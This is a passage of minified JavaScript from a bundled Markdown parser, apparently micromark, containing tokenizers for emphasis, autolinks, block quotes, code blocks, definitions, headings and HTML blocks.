r.includeHtml=="boolean"?r.includeHtml:!0;return hk(e,i,s)}function hk(e,n,r){if(wF(e)){if("value"in e)return e.type==="html"&&!r?"":e.value;if(n&&"alt"in e&&e.alt)return e.alt;if("children"in e)return dw(e.children,n,r)}return Array.isArray(e)?dw(e,n,r):""}function dw(e,n,r){const i=[];let s=-1;for(;++s<e.length;)i[s]=hk(e[s],n,r);return i.join("")}function wF(e){return!!(e&&typeof e=="object")}const pw=document.createElement("i");function Jo(e){const n="&"+e+";";pw.innerHTML=n;const r=pw.textContent;return r.charCodeAt(r.length-1)===59&&e!=="semi"||r===n?!1:r}function Pn(e,n,r,i){const s=e.length;let u=0,c;if(n<0?n=-n>s?0:s+n:n=n>s?s:n,r=r>0?r:0,i.length<1e4)c=Array.from(i),c.unshift(n,r),e.splice(...c);else for(r&&e.splice(n,r);u<i.length;)c=i.slice(u,u+1e4),c.unshift(n,0),e.splice(...c),u+=1e4,n+=1e4}function hn(e,n){return e.length>0?(Pn(e,e.length,0,n),e):n}const fw={}.hasOwnProperty;function RF(e){const n={};let r=-1;for(;++r<e.length;)xF(n,e[r]);return n}function xF(e,n){let r;for(r in n){const s=(fw.call(e,r)?e[r]:void 0)||(e[r]={}),u=n[r];let c;if(u)for(c in u){fw.call(s,c)||(s[c]=[]);const d=u[c];kF(s[c],Array.isArray(d)?d:d?[d]:[])}}}function kF(e,n){let r=-1;const i=[];for(;++r<n.length;)(n[r].add==="after"?e:i).push(n[r]);Pn(e,0,0,i)}function bk(e,n){const r=Number.parseInt(e,n);return r<9||r===11||r>13&&r<32||r>126&&r<160||r>55295&&r<57344||r>64975&&r<65008||(r&65535)===65535||(r&65535)===65534||r>1114111?"�":String.fromCodePoint(r)}function yi(e){return e.replace(/[\t\n\r ]+/g," ").replace(/^ | $/g,"").toLowerCase().toUpperCase()}const Fn=Va(/[A-Za-z]/),rn=Va(/[\dA-Za-z]/),NF=Va(/[#-'*+\--9=?A-Z^-~]/);function ff(e){return e!==null&&(e<32||e===127)}const gf=Va(/\d/),CF=Va(/[\dA-Fa-f]/),IF=Va(/[!-/:-@[-`{-~]/);function Ee(e){return e!==null&&e<-2}function Yt(e){return e!==null&&(e<0||e===32)}function Me(e){return e===-2||e===-1||e===32}const OF=Va(new RegExp("\\p{P}|\\p{S}","u")),LF=Va(/\s/);function Va(e){return n;function n(r){return r!==null&&r>-1&&e.test(String.fromCharCode(r))}}function wi(e){const n=[];let r=-1,i=0,s=0;for(;++r<e.length;){const u=e.charCodeAt(r);let c="";if(u===37&&rn(e.charCodeAt(r+1))&&rn(e.charCodeAt(r+2)))s=2;else if(u<128)/[!#$&-;=?-Z_a-z~]/.test(String.fromCharCode(u))||(c=String.fromCharCode(u));else if(u>55295&&u<57344){const d=e.charCodeAt(r+1);u<56320&&d>56319&&d<57344?(c=String.fromCharCode(u,d),s=1):c="�"}else c=String.fromCharCode(u);c&&(n.push(e.slice(i,r),encodeURIComponent(c)),i=r+s+1,c=""),s&&(r+=s,s=0)}return n.join("")+e.slice(i)}function Ye(e,n,r,i){const s=i?i-1:Number.POSITIVE_INFINITY;let u=0;return c;function c(g){return Me(g)?(e.enter(r),d(g)):n(g)}function d(g){return Me(g)&&u++<s?(e.consume(g),d):(e.exit(r),n(g))}}const DF={tokenize:MF};function MF(e){const n=e.attempt(this.parser.constructs.contentInitial,i,s);let r;return n;function i(d){if(d===null){e.consume(d);return}return e.enter("lineEnding"),e.consume(d),e.exit("lineEnding"),Ye(e,n,"linePrefix")}function s(d){return e.enter("paragraph"),u(d)}function u(d){const g=e.enter("chunkText",{contentType:"text",previous:r});return r&&(r.next=g),r=g,c(d)}function c(d){if(d===null){e.exit("chunkText"),e.exit("paragraph"),e.consume(d);return}return Ee(d)?(e.consume(d),e.exit("chunkText"),u):(e.consume(d),c)}}const FF={tokenize:BF},gw={tokenize:UF};function BF(e){const n=this,r=[];let i=0,s,u,c;return d;function d(N){if(i<r.length){const $=r[i];return n.containerState=$[1],e.attempt($[0].continuation,g,f)(N)}return f(N)}function g(N){if(i++,n.containerState._closeFlow){n.containerState._closeFlow=void 0,s&&O();const $=n.events.length;let G=$,D;for(;G--;)if(n.events[G][0]==="exit"&&n.events[G][1].type==="chunkFlow"){D=n.events[G][1].end;break}w(i);let V=$;for(;V<n.events.length;)n.events[V][1].end={...D},V++;return Pn(n.events,G+1,0,n.events.slice($)),n.events.length=V,f(N)}return d(N)}function f(N){if(i===r.length){if(!s)return y(N);if(s.currentConstruct&&s.currentConstruct.concrete)return T(N);n.interrupt=!!(s.currentConstruct&&!s._gfmTableDynamicInterruptHack)}return n.containerState={},e.check(gw,h,b)(N)}function h(N){return s&&O(),w(i),y(N)}function b(N){return n.parser.lazy[n.now().line]=i!==r.length,c=n.now().offset,T(N)}function y(N){return n.containerState={},e.attempt(gw,S,T)(N)}function S(N){return i++,r.push([n.currentConstruct,n.containerState]),y(N)}function T(N){if(N===null){s&&O(),w(0),e.consume(N);return}return s=s||n.parser.flow(n.now()),e.enter("chunkFlow",{_tokenizer:s,contentType:"flow",previous:u}),x(N)}function x(N){if(N===null){A(e.exit("chunkFlow"),!0),w(0),e.consume(N);return}return Ee(N)?(e.consume(N),A(e.exit("chunkFlow")),i=0,n.interrupt=void 0,d):(e.consume(N),x)}function A(N,$){const G=n.sliceStream(N);if($&&G.push(null),N.previous=u,u&&(u.next=N),u=N,s.defineSkip(N.start),s.write(G),n.parser.lazy[N.start.line]){let D=s.events.length;for(;D--;)if(s.events[D][1].start.offset<c&&(!s.events[D][1].end||s.events[D][1].end.offset>c))return;const V=n.events.length;let K=V,ae,ie;for(;K--;)if(n.events[K][0]==="exit"&&n.events[K][1].type==="chunkFlow"){if(ae){ie=n.events[K][1].end;break}ae=!0}for(w(i),D=V;D<n.events.length;)n.events[D][1].end={...ie},D++;Pn(n.events,K+1,0,n.events.slice(V)),n.events.length=D}}function w(N){let $=r.length;for(;$-- >N;){const G=r[$];n.containerState=G[1],G[0].exit.call(n,e)}r.length=N}function O(){s.write([null]),u=void 0,s=void 0,n.containerState._closeFlow=void 0}}function UF(e,n,r){return Ye(e,e.attempt(this.parser.constructs.document,n,r),"linePrefix",this.parser.constructs.disable.null.includes("codeIndented")?void 0:4)}function mw(e){if(e===null||Yt(e)||LF(e))return 1;if(OF(e))return 2}function pg(e,n,r){const i=[];let s=-1;for(;++s<e.length;){const u=e[s].resolveAll;u&&!i.includes(u)&&(n=u(n,r),i.push(u))}return n}const mf={name:"attention",resolveAll:zF,tokenize:PF};function zF(e,n){let r=-1,i,s,u,c,d,g,f,h;for(;++r<e.length;)if(e[r][0]==="enter"&&e[r][1].type==="attentionSequence"&&e[r][1]._close){for(i=r;i--;)if(e[i][0]==="exit"&&e[i][1].type==="attentionSequence"&&e[i][1]._open&&n.sliceSerialize(e[i][1]).charCodeAt(0)===n.sliceSerialize(e[r][1]).charCodeAt(0)){if((e[i][1]._close||e[r][1]._open)&&(e[r][1].end.offset-e[r][1].start.offset)%3&&!((e[i][1].end.offset-e[i][1].start.offset+e[r][1].end.offset-e[r][1].start.offset)%3))continue;g=e[i][1].end.offset-e[i][1].start.offset>1&&e[r][1].end.offset-e[r][1].start.offset>1?2:1;const b={...e[i][1].end},y={...e[r][1].start};hw(b,-g),hw(y,g),c={type:g>1?"strongSequence":"emphasisSequence",start:b,end:{...e[i][1].end}},d={type:g>1?"strongSequence":"emphasisSequence",start:{...e[r][1].start},end:y},u={type:g>1?"strongText":"emphasisText",start:{...e[i][1].end},end:{...e[r][1].start}},s={type:g>1?"strong":"emphasis",start:{...c.start},end:{...d.end}},e[i][1].end={...c.start},e[r][1].start={...d.end},f=[],e[i][1].end.offset-e[i][1].start.offset&&(f=hn(f,[["enter",e[i][1],n],["exit",e[i][1],n]])),f=hn(f,[["enter",s,n],["enter",c,n],["exit",c,n],["enter",u,n]]),f=hn(f,pg(n.parser.constructs.insideSpan.null,e.slice(i+1,r),n)),f=hn(f,[["exit",u,n],["enter",d,n],["exit",d,n],["exit",s,n]]),e[r][1].end.offset-e[r][1].start.offset?(h=2,f=hn(f,[["enter",e[r][1],n],["exit",e[r][1],n]])):h=0,Pn(e,i-1,r-i+3,f),r=i+f.length-h-2;break}}for(r=-1;++r<e.length;)e[r][1].type==="attentionSequence"&&(e[r][1].type="data");return e}function PF(e,n){const r=this.parser.constructs.attentionMarkers.null,i=this.previous,s=mw(i);let u;return c;function c(g){return u=g,e.enter("attentionSequence"),d(g)}function d(g){if(g===u)return e.consume(g),d;const f=e.exit("attentionSequence"),h=mw(g),b=!h||h===2&&s||r.includes(g),y=!s||s===2&&h||r.includes(i);return f._open=!!(u===42?b:b&&(s||!y)),f._close=!!(u===42?y:y&&(h||!b)),n(g)}}function hw(e,n){e.column+=n,e.offset+=n,e._bufferIndex+=n}const GF={name:"autolink",tokenize:jF};function jF(e,n,r){let i=0;return s;function s(S){return e.enter("autolink"),e.enter("autolinkMarker"),e.consume(S),e.exit("autolinkMarker"),e.enter("autolinkProtocol"),u}function u(S){return Fn(S)?(e.consume(S),c):S===64?r(S):f(S)}function c(S){return S===43||S===45||S===46||rn(S)?(i=1,d(S)):f(S)}function d(S){return S===58?(e.consume(S),i=0,g):(S===43||S===45||S===46||rn(S))&&i++<32?(e.consume(S),d):(i=0,f(S))}function g(S){return S===62?(e.exit("autolinkProtocol"),e.enter("autolinkMarker"),e.consume(S),e.exit("autolinkMarker"),e.exit("autolink"),n):S===null||S===32||S===60||ff(S)?r(S):(e.consume(S),g)}function f(S){return S===64?(e.consume(S),h):NF(S)?(e.consume(S),f):r(S)}function h(S){return rn(S)?b(S):r(S)}function b(S){return S===46?(e.consume(S),i=0,h):S===62?(e.exit("autolinkProtocol").type="autolinkEmail",e.enter("autolinkMarker"),e.consume(S),e.exit("autolinkMarker"),e.exit("autolink"),n):y(S)}function y(S){if((S===45||rn(S))&&i++<63){const T=S===45?y:b;return e.consume(S),T}return r(S)}}const vu={partial:!0,tokenize:$F};function $F(e,n,r){return i;function i(u){return Me(u)?Ye(e,s,"linePrefix")(u):s(u)}function s(u){return u===null||Ee(u)?n(u):r(u)}}const yk={continuation:{tokenize:VF},exit:qF,name:"blockQuote",tokenize:HF};function HF(e,n,r){const i=this;return s;function s(c){if(c===62){const d=i.containerState;return d.open||(e.enter("blockQuote",{_container:!0}),d.open=!0),e.enter("blockQuotePrefix"),e.enter("blockQuoteMarker"),e.consume(c),e.exit("blockQuoteMarker"),u}return r(c)}function u(c){return Me(c)?(e.enter("blockQuotePrefixWhitespace"),e.consume(c),e.exit("blockQuotePrefixWhitespace"),e.exit("blockQuotePrefix"),n):(e.exit("blockQuotePrefix"),n(c))}}function VF(e,n,r){const i=this;return s;function s(c){return Me(c)?Ye(e,u,"linePrefix",i.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(c):u(c)}function u(c){return e.attempt(yk,n,r)(c)}}function qF(e){e.exit("blockQuote")}const Ek={name:"characterEscape",tokenize:YF};function YF(e,n,r){return i;function i(u){return e.enter("characterEscape"),e.enter("escapeMarker"),e.consume(u),e.exit("escapeMarker"),s}function s(u){return IF(u)?(e.enter("characterEscapeValue"),e.consume(u),e.exit("characterEscapeValue"),e.exit("characterEscape"),n):r(u)}}const Sk={name:"characterReference",tokenize:WF};function WF(e,n,r){const i=this;let s=0,u,c;return d;function d(b){return e.enter("characterReference"),e.enter("characterReferenceMarker"),e.consume(b),e.exit("characterReferenceMarker"),g}function g(b){return b===35?(e.enter("characterReferenceMarkerNumeric"),e.consume(b),e.exit("characterReferenceMarkerNumeric"),f):(e.enter("characterReferenceValue"),u=31,c=rn,h(b))}function f(b){return b===88||b===120?(e.enter("characterReferenceMarkerHexadecimal"),e.consume(b),e.exit("characterReferenceMarkerHexadecimal"),e.enter("characterReferenceValue"),u=6,c=CF,h):(e.enter("characterReferenceValue"),u=7,c=gf,h(b))}function h(b){if(b===59&&s){const y=e.exit("characterReferenceValue");return c===rn&&!Jo(i.sliceSerialize(y))?r(b):(e.enter("characterReferenceMarker"),e.consume(b),e.exit("characterReferenceMarker"),e.exit("characterReference"),n)}return c(b)&&s++<u?(e.consume(b),h):r(b)}}const bw={partial:!0,tokenize:XF},yw={concrete:!0,name:"codeFenced",tokenize:KF};function KF(e,n,r){const i=this,s={partial:!0,tokenize:G};let u=0,c=0,d;return g;function g(D){return f(D)}function f(D){const V=i.events[i.events.length-1];return u=V&&V[1].type==="linePrefix"?V[2].sliceSerialize(V[1],!0).length:0,d=D,e.enter("codeFenced"),e.enter("codeFencedFence"),e.enter("codeFencedFenceSequence"),h(D)}function h(D){return D===d?(c++,e.consume(D),h):c<3?r(D):(e.exit("codeFencedFenceSequence"),Me(D)?Ye(e,b,"whitespace")(D):b(D))}function b(D){return D===null||Ee(D)?(e.exit("codeFencedFence"),i.interrupt?n(D):e.check(bw,x,$)(D)):(e.enter("codeFencedFenceInfo"),e.enter("chunkString",{contentType:"string"}),y(D))}function y(D){return D===null||Ee(D)?(e.exit("chunkString"),e.exit("codeFencedFenceInfo"),b(D)):Me(D)?(e.exit("chunkString"),e.exit("codeFencedFenceInfo"),Ye(e,S,"whitespace")(D)):D===96&&D===d?r(D):(e.consume(D),y)}function S(D){return D===null||Ee(D)?b(D):(e.enter("codeFencedFenceMeta"),e.enter("chunkString",{contentType:"string"}),T(D))}function T(D){return D===null||Ee(D)?(e.exit("chunkString"),e.exit("codeFencedFenceMeta"),b(D)):D===96&&D===d?r(D):(e.consume(D),T)}function x(D){return e.attempt(s,$,A)(D)}function A(D){return e.enter("lineEnding"),e.consume(D),e.exit("lineEnding"),w}function w(D){return u>0&&Me(D)?Ye(e,O,"linePrefix",u+1)(D):O(D)}function O(D){return D===null||Ee(D)?e.check(bw,x,$)(D):(e.enter("codeFlowValue"),N(D))}function N(D){return D===null||Ee(D)?(e.exit("codeFlowValue"),O(D)):(e.consume(D),N)}function $(D){return e.exit("codeFenced"),n(D)}function G(D,V,K){let ae=0;return ie;function ie(J){return D.enter("lineEnding"),D.consume(J),D.exit("lineEnding"),ee}function ee(J){return D.enter("codeFencedFence"),Me(J)?Ye(D,te,"linePrefix",i.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(J):te(J)}function te(J){return J===d?(D.enter("codeFencedFenceSequence"),se(J)):K(J)}function se(J){return J===d?(ae++,D.consume(J),se):ae>=c?(D.exit("codeFencedFenceSequence"),Me(J)?Ye(D,re,"whitespace")(J):re(J)):K(J)}function re(J){return J===null||Ee(J)?(D.exit("codeFencedFence"),V(J)):K(J)}}}function XF(e,n,r){const i=this;return s;function s(c){return c===null?r(c):(e.enter("lineEnding"),e.consume(c),e.exit("lineEnding"),u)}function u(c){return i.parser.lazy[i.now().line]?r(c):n(c)}}const xp={name:"codeIndented",tokenize:QF},ZF={partial:!0,tokenize:JF};function QF(e,n,r){const i=this;return s;function s(f){return e.enter("codeIndented"),Ye(e,u,"linePrefix",5)(f)}function u(f){const h=i.events[i.events.length-1];return h&&h[1].type==="linePrefix"&&h[2].sliceSerialize(h[1],!0).length>=4?c(f):r(f)}function c(f){return f===null?g(f):Ee(f)?e.attempt(ZF,c,g)(f):(e.enter("codeFlowValue"),d(f))}function d(f){return f===null||Ee(f)?(e.exit("codeFlowValue"),c(f)):(e.consume(f),d)}function g(f){return e.exit("codeIndented"),n(f)}}function JF(e,n,r){const i=this;return s;function s(c){return i.parser.lazy[i.now().line]?r(c):Ee(c)?(e.enter("lineEnding"),e.consume(c),e.exit("lineEnding"),s):Ye(e,u,"linePrefix",5)(c)}function u(c){const d=i.events[i.events.length-1];return d&&d[1].type==="linePrefix"&&d[2].sliceSerialize(d[1],!0).length>=4?n(c):Ee(c)?s(c):r(c)}}const eB={name:"codeText",previous:nB,resolve:tB,tokenize:aB};function tB(e){let n=e.length-4,r=3,i,s;if((e[r][1].type==="lineEnding"||e[r][1].type==="space")&&(e[n][1].type==="lineEnding"||e[n][1].type==="space")){for(i=r;++i<n;)if(e[i][1].type==="codeTextData"){e[r][1].type="codeTextPadding",e[n][1].type="codeTextPadding",r+=2,n-=2;break}}for(i=r-1,n++;++i<=n;)s===void 0?i!==n&&e[i][1].type!=="lineEnding"&&(s=i):(i===n||e[i][1].type==="lineEnding")&&(e[s][1].type="codeTextData",i!==s+2&&(e[s][1].end=e[i-1][1].end,e.splice(s+2,i-s-2),n-=i-s-2,i=s+2),s=void 0);return e}function nB(e){return e!==96||this.events[this.events.length-1][1].type==="characterEscape"}function aB(e,n,r){let i=0,s,u;return c;function c(b){return e.enter("codeText"),e.enter("codeTextSequence"),d(b)}function d(b){return b===96?(e.consume(b),i++,d):(e.exit("codeTextSequence"),g(b))}function g(b){return b===null?r(b):b===32?(e.enter("space"),e.consume(b),e.exit("space"),g):b===96?(u=e.enter("codeTextSequence"),s=0,h(b)):Ee(b)?(e.enter("lineEnding"),e.consume(b),e.exit("lineEnding"),g):(e.enter("codeTextData"),f(b))}function f(b){return b===null||b===32||b===96||Ee(b)?(e.exit("codeTextData"),g(b)):(e.consume(b),f)}function h(b){return b===96?(e.consume(b),s++,h):s===i?(e.exit("codeTextSequence"),e.exit("codeText"),n(b)):(u.type="codeTextData",f(b))}}class rB{constructor(n){this.left=n?[...n]:[],this.right=[]}get(n){if(n<0||n>=this.left.length+this.right.length)throw new RangeError("Cannot access index `"+n+"` in a splice buffer of size `"+(this.left.length+this.right.length)+"`");return n<this.left.length?this.left[n]:this.right[this.right.length-n+this.left.length-1]}get length(){return this.left.length+this.right.length}shift(){return this.setCursor(0),this.right.pop()}slice(n,r){const i=r??Number.POSITIVE_INFINITY;return i<this.left.length?this.left.slice(n,i):n>this.left.length?this.right.slice(this.right.length-i+this.left.length,this.right.length-n+this.left.length).reverse():this.left.slice(n).concat(this.right.slice(this.right.length-i+this.left.length).reverse())}splice(n,r,i){const s=r||0;this.setCursor(Math.trunc(n));const u=this.right.splice(this.right.length-s,Number.POSITIVE_INFINITY);return i&&Oo(this.left,i),u.reverse()}pop(){return this.setCursor(Number.POSITIVE_INFINITY),this.left.pop()}push(n){this.setCursor(Number.POSITIVE_INFINITY),this.left.push(n)}pushMany(n){this.setCursor(Number.POSITIVE_INFINITY),Oo(this.left,n)}unshift(n){this.setCursor(0),this.right.push(n)}unshiftMany(n){this.setCursor(0),Oo(this.right,n.reverse())}setCursor(n){if(!(n===this.left.length||n>this.left.length&&this.right.length===0||n<0&&this.left.length===0))if(n<this.left.length){const r=this.left.splice(n,Number.POSITIVE_INFINITY);Oo(this.right,r.reverse())}else{const r=this.right.splice(this.left.length+this.right.length-n,Number.POSITIVE_INFINITY);Oo(this.left,r.reverse())}}}function Oo(e,n){let r=0;if(n.length<1e4)e.push(...n);else for(;r<n.length;)e.push(...n.slice(r,r+1e4)),r+=1e4}function vk(e){const n={};let r=-1,i,s,u,c,d,g,f;const h=new rB(e);for(;++r<h.length;){for(;r in n;)r=n[r];if(i=h.get(r),r&&i[1].type==="chunkFlow"&&h.get(r-1)[1].type==="listItemPrefix"&&(g=i[1]._tokenizer.events,u=0,u<g.length&&g[u][1].type==="lineEndingBlank"&&(u+=2),u<g.length&&g[u][1].type==="content"))for(;++u<g.length&&g[u][1].type!=="content";)g[u][1].type==="chunkText"&&(g[u][1]._isInFirstContentOfListItem=!0,u++);if(i[0]==="enter")i[1].contentType&&(Object.assign(n,iB(h,r)),r=n[r],f=!0);else if(i[1]._container){for(u=r,s=void 0;u--;)if(c=h.get(u),c[1].type==="lineEnding"||c[1].type==="lineEndingBlank")c[0]==="enter"&&(s&&(h.get(s)[1].type="lineEndingBlank"),c[1].type="lineEnding",s=u);else if(!(c[1].type==="linePrefix"||c[1].type==="listItemIndent"))break;s&&(i[1].end={...h.get(s)[1].start},d=h.slice(s,r),d.unshift(i),h.splice(s,r-s+1,d))}}return Pn(e,0,Number.POSITIVE_INFINITY,h.slice(0)),!f}function iB(e,n){const r=e.get(n)[1],i=e.get(n)[2];let s=n-1;const u=[];let c=r._tokenizer;c||(c=i.parser[r.contentType](r.start),r._contentTypeTextTrailing&&(c._contentTypeTextTrailing=!0));const d=c.events,g=[],f={};let h,b,y=-1,S=r,T=0,x=0;const A=[x];for(;S;){for(;e.get(++s)[1]!==S;);u.push(s),S._tokenizer||(h=i.sliceStream(S),S.next||h.push(null),b&&c.defineSkip(S.start),S._isInFirstContentOfListItem&&(c._gfmTasklistFirstContentOfListItem=!0),c.write(h),S._isInFirstContentOfListItem&&(c._gfmTasklistFirstContentOfListItem=void 0)),b=S,S=S.next}for(S=r;++y<d.length;)d[y][0]==="exit"&&d[y-1][0]==="enter"&&d[y][1].type===d[y-1][1].type&&d[y][1].start.line!==d[y][1].end.line&&(x=y+1,A.push(x),S._tokenizer=void 0,S.previous=void 0,S=S.next);for(c.events=[],S?(S._tokenizer=void 0,S.previous=void 0):A.pop(),y=A.length;y--;){const w=d.slice(A[y],A[y+1]),O=u.pop();g.push([O,O+w.length-1]),e.splice(O,2,w)}for(g.reverse(),y=-1;++y<g.length;)f[T+g[y][0]]=T+g[y][1],T+=g[y][1]-g[y][0]-1;return f}const oB={resolve:lB,tokenize:uB},sB={partial:!0,tokenize:cB};function lB(e){return vk(e),e}function uB(e,n){let r;return i;function i(d){return e.enter("content"),r=e.enter("chunkContent",{contentType:"content"}),s(d)}function s(d){return d===null?u(d):Ee(d)?e.check(sB,c,u)(d):(e.consume(d),s)}function u(d){return e.exit("chunkContent"),e.exit("content"),n(d)}function c(d){return e.consume(d),e.exit("chunkContent"),r.next=e.enter("chunkContent",{contentType:"content",previous:r}),r=r.next,s}}function cB(e,n,r){const i=this;return s;function s(c){return e.exit("chunkContent"),e.enter("lineEnding"),e.consume(c),e.exit("lineEnding"),Ye(e,u,"linePrefix")}function u(c){if(c===null||Ee(c))return r(c);const d=i.events[i.events.length-1];return!i.parser.constructs.disable.null.includes("codeIndented")&&d&&d[1].type==="linePrefix"&&d[2].sliceSerialize(d[1],!0).length>=4?n(c):e.interrupt(i.parser.constructs.flow,r,n)(c)}}function Tk(e,n,r,i,s,u,c,d,g){const f=g||Number.POSITIVE_INFINITY;let h=0;return b;function b(w){return w===60?(e.enter(i),e.enter(s),e.enter(u),e.consume(w),e.exit(u),y):w===null||w===32||w===41||ff(w)?r(w):(e.enter(i),e.enter(c),e.enter(d),e.enter("chunkString",{contentType:"string"}),x(w))}function y(w){return w===62?(e.enter(u),e.consume(w),e.exit(u),e.exit(s),e.exit(i),n):(e.enter(d),e.enter("chunkString",{contentType:"string"}),S(w))}function S(w){return w===62?(e.exit("chunkString"),e.exit(d),y(w)):w===null||w===60||Ee(w)?r(w):(e.consume(w),w===92?T:S)}function T(w){return w===60||w===62||w===92?(e.consume(w),S):S(w)}function x(w){return!h&&(w===null||w===41||Yt(w))?(e.exit("chunkString"),e.exit(d),e.exit(c),e.exit(i),n(w)):h<f&&w===40?(e.consume(w),h++,x):w===41?(e.consume(w),h--,x):w===null||w===32||w===40||ff(w)?r(w):(e.consume(w),w===92?A:x)}function A(w){return w===40||w===41||w===92?(e.consume(w),x):x(w)}}function _k(e,n,r,i,s,u){const c=this;let d=0,g;return f;function f(S){return e.enter(i),e.enter(s),e.consume(S),e.exit(s),e.enter(u),h}function h(S){return d>999||S===null||S===91||S===93&&!g||S===94&&!d&&"_hiddenFootnoteSupport"in c.parser.constructs?r(S):S===93?(e.exit(u),e.enter(s),e.consume(S),e.exit(s),e.exit(i),n):Ee(S)?(e.enter("lineEnding"),e.consume(S),e.exit("lineEnding"),h):(e.enter("chunkString",{contentType:"string"}),b(S))}function b(S){return S===null||S===91||S===93||Ee(S)||d++>999?(e.exit("chunkString"),h(S)):(e.consume(S),g||(g=!Me(S)),S===92?y:b)}function y(S){return S===91||S===92||S===93?(e.consume(S),d++,b):b(S)}}function Ak(e,n,r,i,s,u){let c;return d;function d(y){return y===34||y===39||y===40?(e.enter(i),e.enter(s),e.consume(y),e.exit(s),c=y===40?41:y,g):r(y)}function g(y){return y===c?(e.enter(s),e.consume(y),e.exit(s),e.exit(i),n):(e.enter(u),f(y))}function f(y){return y===c?(e.exit(u),g(c)):y===null?r(y):Ee(y)?(e.enter("lineEnding"),e.consume(y),e.exit("lineEnding"),Ye(e,f,"linePrefix")):(e.enter("chunkString",{contentType:"string"}),h(y))}function h(y){return y===c||y===null||Ee(y)?(e.exit("chunkString"),f(y)):(e.consume(y),y===92?b:h)}function b(y){return y===c||y===92?(e.consume(y),h):h(y)}}function Go(e,n){let r;return i;function i(s){return Ee(s)?(e.enter("lineEnding"),e.consume(s),e.exit("lineEnding"),r=!0,i):Me(s)?Ye(e,i,r?"linePrefix":"lineSuffix")(s):n(s)}}const dB={name:"definition",tokenize:fB},pB={partial:!0,tokenize:gB};function fB(e,n,r){const i=this;let s;return u;function u(S){return e.enter("definition"),c(S)}function c(S){return _k.call(i,e,d,r,"definitionLabel","definitionLabelMarker","definitionLabelString")(S)}function d(S){return s=yi(i.sliceSerialize(i.events[i.events.length-1][1]).slice(1,-1)),S===58?(e.enter("definitionMarker"),e.consume(S),e.exit("definitionMarker"),g):r(S)}function g(S){return Yt(S)?Go(e,f)(S):f(S)}function f(S){return Tk(e,h,r,"definitionDestination","definitionDestinationLiteral","definitionDestinationLiteralMarker","definitionDestinationRaw","definitionDestinationString")(S)}function h(S){return e.attempt(pB,b,b)(S)}function b(S){return Me(S)?Ye(e,y,"whitespace")(S):y(S)}function y(S){return S===null||Ee(S)?(e.exit("definition"),i.parser.defined.push(s),n(S)):r(S)}}function gB(e,n,r){return i;function i(d){return Yt(d)?Go(e,s)(d):r(d)}function s(d){return Ak(e,u,r,"definitionTitle","definitionTitleMarker","definitionTitleString")(d)}function u(d){return Me(d)?Ye(e,c,"whitespace")(d):c(d)}function c(d){return d===null||Ee(d)?n(d):r(d)}}const mB={name:"hardBreakEscape",tokenize:hB};function hB(e,n,r){return i;function i(u){return e.enter("hardBreakEscape"),e.consume(u),s}function s(u){return Ee(u)?(e.exit("hardBreakEscape"),n(u)):r(u)}}const bB={name:"headingAtx",resolve:yB,tokenize:EB};function yB(e,n){let r=e.length-2,i=3,s,u;return e[i][1].type==="whitespace"&&(i+=2),r-2>i&&e[r][1].type==="whitespace"&&(r-=2),e[r][1].type==="atxHeadingSequence"&&(i===r-1||r-4>i&&e[r-2][1].type==="whitespace")&&(r-=i+1===r?2:4),r>i&&(s={type:"atxHeadingText",start:e[i][1].start,end:e[r][1].end},u={type:"chunkText",start:e[i][1].start,end:e[r][1].end,contentType:"text"},Pn(e,i,r-i+1,[["enter",s,n],["enter",u,n],["exit",u,n],["exit",s,n]])),e}function EB(e,n,r){let i=0;return s;function s(h){return e.enter("atxHeading"),u(h)}function u(h){return e.enter("atxHeadingSequence"),c(h)}function c(h){return h===35&&i++<6?(e.consume(h),c):h===null||Yt(h)?(e.exit("atxHeadingSequence"),d(h)):r(h)}function d(h){return h===35?(e.enter("atxHeadingSequence"),g(h)):h===null||Ee(h)?(e.exit("atxHeading"),n(h)):Me(h)?Ye(e,d,"whitespace")(h):(e.enter("atxHeadingText"),f(h))}function g(h){return h===35?(e.consume(h),g):(e.exit("atxHeadingSequence"),d(h))}function f(h){return h===null||h===35||Yt(h)?(e.exit("atxHeadingText"),d(h)):(e.consume(h),f)}}const SB=["address","article","aside","base","basefont","blockquote","body","caption","center","col","colgroup","dd","details","dialog","dir","div","dl","dt","fieldset","figcaption","figure","footer","form","frame","frameset","h1","h2","h3","h4","h5","h6","head","header","hr","html","iframe","legend","li","link","main","menu","menuitem","nav","noframes","ol","optgroup","option","p","param","search","section","summary","table","tbody","td","tfoot","th","thead","title","tr","track","ul"],Ew=["pre","script","style","textarea"],vB={concrete:!0,name:"htmlFlow",resolveTo:AB,tokenize:wB},TB={partial:!0,tokenize:xB},_B={partial:!0,tokenize:RB};function AB(e){let n=e.length;for(;n--&&!(e[n][0]==="enter"&&e[n][1].type==="htmlFlow"););return n>1&&e[n-2][1].type==="linePrefix"&&(e[n][1].start=e[n-2][1].start,e[n+1][1].start=e[n-2][1].start,e.splice(n-2,2)),e}function wB(e,n,r){const i=this;let s,u,c,d,g;return f;function f(R){return h(R)}function h(R){return e.enter("htmlFlow"),e.enter("htmlFlowData"),e.consume(R),b}function b(R){return R===33?(e.consume(R),y):R===47?(e.consume(R),u=!0,x):R===63?(e.consume(R),s=3,i.interrupt?n:k):Fn(R)?(e.consume(R),c=String.fromCharCode(R),A):r(R)}function y(R){return R===45?(e.consume(R),s=2,S):R===91?(e.consume(R),s=5,d=0,T):Fn(R)?(e.consume(R),s=4,i.interrupt?n:k):r(R)}function S(R){return R===45?(e.consume(R),i.interrupt?n:k):r(R)}function T(R){const ue="CDATA[";return R===ue.charCodeAt(d++)?(e.consume(R),d===ue.length?i.interrupt?n:te:T):r(R)}function x(R){return Fn(R)?(e.consume(R),c=String.fromCharCode(R),A):r(R)}function A(R){if(R===null||R===47||R===62||Yt(R)){const ue=R===47,he=c.toLowerCase();return!ue&&!u&&Ew.includes(he)?(s=1,i.interrupt?n(R):te(R)):SB.includes(c.toLowerCase())?(s=6,ue?(e.consume(R),w):i.interrupt?n(R):te(R)):(s=7,i.interrupt&&!i.parser.lazy[i.now().line]?r(R):u?O(R):N(R))}return R===45||rn(R)?(e.consume(R),c+=String.fromCharCode(R),A):r(R)}function w(R){return R===62?(e.consume(R),i.interrupt?n:te):r(R)}function O(R){return Me(R)?(e.consume(R),O):ie(R)}function N(R){return R===47?(e.consume(R),ie):R===58||R===95||Fn(R)?(e.consume(R),$):Me(R)?(e.consume(R),N):ie(R)}function $(R){return R===45||R===46||R===58||R===95||rn(R)?(e.consume(R),$):G(R)}function G(R){return R===61?(e.consume(R),D):Me(R)?(e.consume(R),G):N(R)}function D(R){return 